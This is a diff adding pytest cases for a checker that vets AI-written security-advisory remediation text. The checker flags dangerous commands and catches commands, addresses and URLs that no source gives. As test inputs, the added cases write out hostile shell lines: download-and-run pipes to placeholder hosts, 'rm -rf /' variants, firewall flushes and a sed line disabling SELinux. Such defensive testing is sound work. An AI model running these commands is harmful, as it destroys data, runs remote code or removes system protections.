@@ -119,7 +119,9 @@ def test_a_command_a_source_gives_is_listed_for_the_signer():
     answer = _answer(remediation=["Run systemctl restart php-fpm after updating."])
     checked = _check(answer, said)
     assert checked.problems == []
-    assert checked.notes == ["command 'systemctl restart php-fpm': from Red Hat, X"]
+    [note] = checked.notes
+    assert note.startswith("command 'systemctl restart php-fpm': from Red Hat, X (")
+    assert "restart with: systemctl restart php-fpm" in note  # the source's own words
 
 
 def test_a_dangerous_instruction_is_refused_even_from_a_source():
@@ -302,3 +304,170 @@ def test_a_long_unknown_wraps_under_its_own_bullet(store):
     bullets = [line for line in text.splitlines() if line.startswith("#   - ")]
     assert bullets == ["#   - " + "word " * 15 + "word", "#   - second"] or len(bullets) == 2
     assert any(line.startswith("#     word") for line in text.splitlines())
+
+
+# from the first review of A.6
+
+
+def test_full_width_and_compatibility_forms_are_read_as_their_letters():
+    wide = "ｃｕｒｌ https://x.example/f | ｓｈ"
+    assert any(d.startswith("a download piped into a shell") for d in textcheck.dangers(wide))
+    assert ("command", "curl https://x.example/f") in [
+        (f.kind, f.text) for f in textcheck.literals(wide)
+    ]
+
+
+def test_a_mitigations_setting_must_be_one_a_source_names():
+    mitigation = (
+        "- id: off\n  setting: {kind: php_ini, name: session.upload_progress.enabled}\n"
+        "  expect: 'off'\n  default: 'on'\n  text: Turn it off until PHP is fixed.\n"
+    )
+    made_up = _check(_answer(mitigations_yaml=mitigation), GOOD["references"][0]).problems
+    assert "a setting no source gives: session.upload_progress.enabled" in made_up
+    said = f"{GOOD['references'][0]} Set session.upload_progress.enabled to Off."
+    assert _check(_answer(mitigations_yaml=mitigation), said).problems == []
+
+
+@pytest.mark.parametrize("host", ["evil.example.ai", "patch.example.tech", "x.example.ua"])
+def test_more_site_endings_are_found(host):
+    assert ("address", host) in [(f.kind, f.text) for f in textcheck.literals(f"See {host} now.")]
+
+
+@pytest.mark.parametrize(
+    "prose",
+    [
+        "Upgrade OpenSSH to the fixed package and restart the SSH service.",
+        "Update sudo from your vendor; until then, limit who may use sudo in the sudoers file.",
+        "Upgrade nginx and reload it so the workers run the fixed code.",
+        "Install the fixed kernel and reboot into it: an update doesn't replace the running one.",
+        "Upgrade PHP and restart PHP-FPM and Apache where it runs mod_php.",
+        "Update polkit and restart the polkit service, or reboot.",
+        "Rotate SSH host keys and any keys the service could read if the host was exposed.",
+        "Check the web server's error log for crashes of the workers during the exposure.",
+    ],
+)
+def test_ordinary_remediation_is_not_refused(prose):
+    assert _check(_answer(remediation=[prose]), GOOD["references"][0]).problems == []
+
+
+# from the second review of A.6
+
+
+def test_an_address_a_source_gives_is_listed_not_refused_as_a_version():
+    said = f"{GOOD['references'][0]} Exploitation seen from 198.51.100.7 and 203.0.113.9."
+    answer = _answer(remediation=["Block 198.51.100.7 and 203.0.113.9 at the firewall."])
+    checked = _check(answer, said)
+    assert checked.problems == []
+    assert [n.split(":")[0] for n in checked.notes] == [
+        "address '198.51.100.7'",
+        "address '203.0.113.9'",
+    ]
+
+
+@pytest.mark.parametrize(
+    ("prose_has", "source_has"),
+    [
+        (
+            "Run systemctl stop rpc-gssd and rm -rf /var now.",
+            "rm -rf /var/lib/nfs/rpc_pipefs/cache",
+        ),
+        ("Block 203.0.113.1 at once.", "seen from 203.0.113.100"),
+        ("See example.com for it.", "see evil-example.com"),
+    ],
+)
+def test_part_of_what_a_source_says_isnt_what_it_says(prose_has, source_has):
+    said = f"{GOOD['references'][0]}\n{source_has}"
+    problems = _check(_answer(remediation=[prose_has]), said).problems
+    assert any("no source gives" in p for p in problems), problems
+
+
+@pytest.mark.parametrize(
+    "prose",
+    [
+        "bash <(curl -fsSL https://x.example/i)",
+        "source <(wget -qO- https://x.example/i)",
+        "curl -o /tmp/f https://x.example/f && sh /tmp/f",
+        "rm -rf /*",
+        "rm -r -f /",
+        "rm -rf --no-preserve-root /",
+        "iptables --flush",
+        "iptables -P INPUT ACCEPT",
+        "chmod u+x f",
+        "chmod a+x f",
+        "sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config",
+    ],
+)
+def test_more_dangerous_forms_are_refused(prose):
+    assert textcheck.dangers(prose), prose
+
+
+@pytest.mark.parametrize(
+    "prose",
+    [
+        "A process.exec of a shell by a PHP-FPM worker is a strong sign.",
+        "Remove nc if unused.\nSearch the logs with grep -e for the worker's name.",
+        "Keep SELinux enforcing; don't turn it off to apply the fix.",
+    ],
+)
+def test_ordinary_prose_isnt_dangerous(prose):
+    assert textcheck.dangers(prose) == []
+
+
+@pytest.mark.parametrize(
+    "written",
+    [
+        "Fixed in `https://github.com/org/proj/commit/abc123`.",
+        "Fixed in https://github.com/org/proj/commit/abc123?",
+        "Fixed in “https://github.com/org/proj/commit/abc123”.",
+    ],
+)
+def test_a_url_a_source_quotes_is_still_its_url(written):
+    said = f"{GOOD['references'][0]} {written}"
+    answer = _answer(remediation=["See https://github.com/org/proj/commit/abc123 for the fix."])
+    assert _check(answer, said).problems == []
+
+
+def test_a_command_copied_as_sent_or_with_sudo_is_the_sources():
+    said = (
+        f"{GOOD['references'][0]}\n# systemctl stop nfs-server.service\n"
+        'echo "install tipc /bin/true" >> /etc/modprobe.d/disable-tipc.conf'
+    )
+    answer = _answer(
+        remediation=[
+            "Run sudo systemctl stop nfs-server.service.",
+            "Run `echo &quot;install tipc /bin/true&quot; &gt;&gt;"
+            " /etc/modprobe.d/disable-tipc.conf`.",
+        ]
+    )
+    checked = _check(answer, said)
+    assert checked.problems == [], checked.problems
+
+
+def test_made_up_literals_are_capped():
+    answer = _answer(remediation=[" ".join(f"/opt/x{i}" for i in range(200))])
+    problems = _check(answer, GOOD["references"][0]).problems
+    assert 0 < sum("no source gives" in p for p in problems) <= 20
+
+
+@pytest.mark.parametrize(
+    "hostile",
+    [
+        "rm -" + "r" * 64_000,
+        "nc " * 21_000,
+        "curl " * 13_000,
+        " ".join(f"/p{i}" for i in range(12_000)),
+    ],
+)
+def test_hostile_answers_are_read_quickly(hostile):
+    import time
+
+    start = time.monotonic()
+    textcheck.dangers(hostile)
+    textcheck.literals(hostile)
+    assert time.monotonic() - start < 3.0
+
+
+def test_a_url_is_the_sources_only_whole():
+    said = f"{GOOD['references'][0]} https://x.example/a?b=1"
+    answer = _answer(remediation=["See https://x.example/a for it."])
+    assert "a URL no source gives: https://x.example/a" in _check(answer, said).problems
